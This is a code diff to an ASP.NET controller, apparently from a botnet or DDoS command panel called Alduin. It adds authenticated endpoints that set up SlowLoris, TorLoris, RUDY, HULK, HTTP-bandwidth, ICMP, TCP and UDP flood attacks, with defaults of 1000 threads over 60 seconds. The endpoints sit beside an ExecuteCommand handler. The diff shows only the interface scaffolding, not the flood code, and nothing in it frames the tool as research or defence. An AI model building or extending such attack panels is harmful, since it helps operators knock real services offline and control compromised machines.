@@ -83,6 +83,107 @@ namespace Alduin.Web.Controllers
             return PartialView("_ARME", model);
         }
         [Authorize]
+        [HttpGet]
+        public IActionResult SlowLoris()
+        {
+            var model = new SlowLorisModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_SlowLoris", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult TorLoris()
+        {
+            var model = new TorLorisModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_TorLoris", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Rudy()
+        {
+            var model = new RudyModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_Rudy", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Hulk()
+        {
+            var model = new HulkModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_Hulk", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult HttpBandwidth()
+        {
+            var model = new HttpBandWidthModel
+            {
+                Port = 80,
+                PostDATA = "Dabala DUDU",
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_HttpBandwidth", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Icmp()
+        {
+            var model = new IcmpModel
+            {
+                Length = 32,
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_Icmp", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Tcp()
+        {
+            var model = new TcpModel
+            {
+                Length = 32,
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_Tcp", model);
+        }
+        [Authorize]
+        [HttpGet]
+        public IActionResult Udp()
+        {
+            var model = new UdpModel
+            {
+                Length = 32,
+                ThreadstoUse = 1000,
+                Time = 60
+            };
+            return PartialView("_Udp", model);
+        }
+        [Authorize]
         [HttpPost]
         public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
         {
